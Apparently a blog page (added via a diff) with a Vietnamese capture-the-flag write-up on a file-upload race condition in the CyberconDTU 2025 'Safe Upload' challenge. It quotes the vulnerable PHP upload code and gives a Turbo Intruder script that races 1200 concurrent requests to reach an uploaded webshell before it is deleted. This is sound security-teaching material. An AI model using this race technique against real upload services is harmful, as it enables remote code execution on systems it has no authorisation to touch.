@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Safe Upload file | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Vulnerability: Upload file To Race Conditon">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Safe Upload file">
+<meta property="og:url" content="https://elliotbigfan.github.io/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/index.html">
+<meta property="og:site_name" content="H00d1eBl4ck">
+<meta property="og:description" content="Vulnerability: Upload file To Race Conditon">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/cybercon/poster_cybercon.jpg">
+<meta property="article:published_time" content="2025-09-25T09:12:34.000Z">
+<meta property="article:modified_time" content="2025-09-25T10:33:39.483Z">
+<meta property="article:author" content="H00d1eBl4ck">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/cybercon/poster_cybercon.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Safe Upload file",
+  "url": "https://elliotbigfan.github.io/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/",
+  "image": "https://elliotbigfan.github.io/img/ctf/cybercon/poster_cybercon.jpg",
+  "datePublished": "2025-09-25T09:12:34.000Z",
+  "dateModified": "2025-09-25T10:33:39.483Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "H00d1eBl4ck",
+      "url": "https://elliotbigfan.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Safe Upload file',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/cybercon/poster_cybercon.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Safe Upload file</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Safe Upload file</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-25T09:12:34.000Z" title="Created 2025-09-25 16:12:34">2025-09-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-25T10:33:39.483Z" title="Updated 2025-09-25 17:33:39">2025-09-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/CyberconDTU-2025/">CyberconDTU 2025</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/CyberconDTU-2025/Web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/CyberconDTU-2025/Web/web-safe-upload/">web safe upload</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">837</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>5mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-Phan-tich-ma-nguon-va-y-tuong"><a href="#1-Phan-tich-ma-nguon-va-y-tuong" class="headerlink" title="1. Phân tích mã nguồn và ý tưởng"></a>1. Phân tích mã nguồn và ý tưởng</h1><ul>
+<li>Đọc qua file <code>.yar</code> (validate file upload), ta có thể thấy các file khi đc upload lên server sẽ được file <code>.yar</code> này validate rất chặt và gần như không thể bypass để upload webshell được.</li>
+<li>Tuy nhiên, khi phân tích file <code>upload.php</code> ta có thể thấy một số đoạn code xử lý không hợp lý và dẫn đến upload file race condition.</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$tmp_path</span>)) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;save failed&#x27;</span>,<span class="number">500</span>); <span class="comment">// move file vào thư mục $tmp_path(/var/www/html/tmp) </span></span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="variable">$tmp_path</span>, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">800</span> * <span class="number">1000</span>); <span class="comment">// sleep 0.8s</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ret</span> === <span class="number">1</span> || <span class="variable">$hitByName</span>) &#123;</span><br><span class="line">  @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>); <span class="comment">// xóa file tại thư mục $tmp_path nếu file chứa nội dung của một webshell </span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Upload scanned: MALWARE detected. File removed.&lt;br&gt;&lt;a href=/&gt;back&lt;/a&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Webshell mà ta sẽ upload lên đầu tiên sẽ được server đưa vào thư mục <code>$tmp_path</code> rồi sau đó server sẽ <code>sleep</code> 0.8s rồi mới xóa webshell của ta.</p>
+</li>
+<li><p>Vậy nếu ta có thể truy cập đúng file webshell của ta trước khi bị nó bị xóa đi thì ta hoàn toàn có thể RCE và đọc được flag.</p>
+</li>
+</ul>
+<h1 id="2-Cac-buoc-khai-thac"><a href="#2-Cac-buoc-khai-thac" class="headerlink" title="2. Các bước khai thác:"></a>2. Các bước khai thác:</h1><ul>
+<li>Đầu tiên ta cần biết webshell mà ta upload đã được đổi tên như thế nào. Dưới đây là đoạn code xử lý đường dẫn đến file được upload.</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$TMP_DIR</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">four_digits</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">str_pad</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">9999</span>), <span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>, STR_PAD_LEFT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$orig</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;noname&#x27;</span>;</span><br><span class="line"><span class="variable">$ext</span>  = <span class="title function_ invoke__">ext_of</span>(<span class="variable">$orig</span>);</span><br><span class="line"><span class="variable">$rand</span> = <span class="title function_ invoke__">four_digits</span>();</span><br><span class="line"><span class="variable">$tmp_path</span> = <span class="variable">$TMP_DIR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$rand</span> . <span class="variable">$ext</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Vậy ta có thể xác định được ta cần truy cập <code>http://localhost:8001/tmp/&lt;random 0-9999&gt;.php</code> để có thể thực thi webshell. </p>
+</li>
+<li><p>Vậy ta cần viết một script có thể tạo được nhiều luồng để có thể nhanh chóng truy cập được vào web shell trước khi nó bị xóa.</p>
+</li>
+<li><p>Tới đây thì mình cũng chưa biết phải tạo script đó như thế nào nên chuyển sang dùng tool và mình dùng <code>burpsuite</code> với extension được tích hợp là <code>Turbo Intruder</code>.</p>
+</li>
+<li><p>Trước tiên mình sẽ bắt gói tin POST upload file rồi gửi qua tab <code>Repeater</code> và sau đó gửi gói tin http <code>GET /tmp/%s.php</code> qua extension <code>Turbo Intruder</code>. </p>
+</li>
+<li><p>Ở mục dùng script python nào cho cuộc tấn công race condition này thì mình dùng script này: <a target="_blank" rel="noopener" href="https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py">https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py</a>.</p>
+</li>
+<li><p>Chỉnh sửa nội dung script trên một tí cho phù hợp với bài CTF này rồi paste vào turbo intruder:</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack</span></span><br><span class="line">    <span class="comment"># if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead</span></span><br><span class="line">    <span class="comment"># for more information, check out https://portswigger.net/research/smashing-the-state-machine</span></span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                           concurrentConnections=<span class="number">1500</span>,</span><br><span class="line">                           engine=Engine.THREADED</span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument withholds part of each request until openGate is invoked</span></span><br><span class="line">    <span class="comment"># if you see a negative timestamp, the server responded before the request was complete</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1200</span>):</span><br><span class="line">        engine.queue(target.req, <span class="built_in">str</span>(i).rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>), gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># once every &#x27;race1&#x27; tagged request has been queued</span></span><br><span class="line">    <span class="comment"># invoke engine.openGate() to send them in sync</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Hành vi của đoạn code trên là dạng <code>concurrent / multi-connection</code> (tương đương “multi-threaded” ở mức khái niệm), khi queue nhiều request rồi cho gửi đồng loạt bằng <code>openGate</code>.</p>
+</li>
+<li><p>Ở đây thì mình chỉ cho gửi 1200 request thôi vì đã thử để 10000 nhiều lần nhưng bị chậm và bị xóa file mất. Vì như thế nên bài này mình sẽ cùng 1 lúc chạy turbo và gửi file nhiều lần cho đến khi tên file rơi vào khoảng từ <code>0000.php</code> đến <code>1200.php</code> thì sẽ ok.</p>
+</li>
+<li><p>Và sao 7749 lần thì flag cũng đã về tay.</p>
+</li>
+<li><p><a href="/img/ctf/cybercon/1.png">!img</a></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/">https://elliotbigfan.github.io/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/cybercon/poster_cybercon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/05/2025/hexo/Hexo/" title="Hexo"><img class="cover" src="/img/hexo/hexo-wall.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Hexo</div></div><div class="info-2"><div class="info-item-1">Hexo IntroductionHexo là một framework blog tĩnh được viết bằng Node.js.Với Hexo, bạn có thể viết bài bằng Markdown, sau đó build ra trang web tĩnh cực nhanh, dễ deploy lên GitHub Pages, Vercel, Netlify, Cloudflare Pages hoặc bất kỳ server nào.    Ưu điểm của Hexo ⚡ Nhanh: build hàng trăm bài viết chỉ trong vài giây.   📝 Markdown-first: viết bài dễ dàng bằng Markdown.   🎨 Nhiều theme&#x2F;plugin: có sẵn kho theme cực lớn (NexT, Butterfly, Icarus, …).   🚀 Triển khai dễ dàng: chỉ cần 1 lệnh ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Phan-tich-ma-nguon-va-y-tuong"><span class="toc-number">1.</span> <span class="toc-text">1. Phân tích mã nguồn và ý tưởng</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Cac-buoc-khai-thac"><span class="toc-number">2.</span> <span class="toc-text">2. Các bước khai thác:</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/" title="Safe Upload file"><img src="/img/ctf/cybercon/poster_cybercon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Safe Upload file"/></a><div class="content"><a class="title" href="/2025/09/25/2025/ctf/cyberconDTU/web/safe-upload/" title="Safe Upload file">Safe Upload file</a><time datetime="2025-09-25T09:12:34.000Z" title="Created 2025-09-25 16:12:34">2025-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/05/2025/hexo/Hexo/" title="Hexo"><img src="/img/hexo/hexo-wall.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hexo"/></a><div class="content"><a class="title" href="/2025/09/05/2025/hexo/Hexo/" title="Hexo">Hexo</a><time datetime="2025-09-05T11:03:45.000Z" title="Created 2025-09-05 18:03:45">2025-09-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/cybercon/poster_cybercon.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
